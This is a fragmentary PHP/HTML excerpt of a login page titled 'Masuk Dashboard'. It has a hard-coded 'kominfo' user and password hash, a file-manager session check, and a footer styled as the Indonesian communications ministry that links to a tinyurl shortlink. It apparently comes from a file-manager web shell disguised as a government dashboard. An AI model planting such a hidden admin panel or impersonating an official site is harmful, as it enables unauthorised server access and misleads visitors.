...
define('APP_TITLE', 'Masuk Dashboard - V1');
$use_auth = true;
$auth_users = array(
    'kominfo' => '$2a$12$F2znIpi72aVqWAJhs3uyHegu3SezA3ZaZ.ZKIafhscUO.0HKIR4BS'
);
...
if ($use_auth) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        <section class="h-100">
			...
			<a href="https://tinyurl.com/komin777" target="_blank" class="text-decoration-none text-muted">© 2023 Kementerian Komunikasi dan Informatika RI</a>
                        </div>
                    </div>
                </div>
            </div>
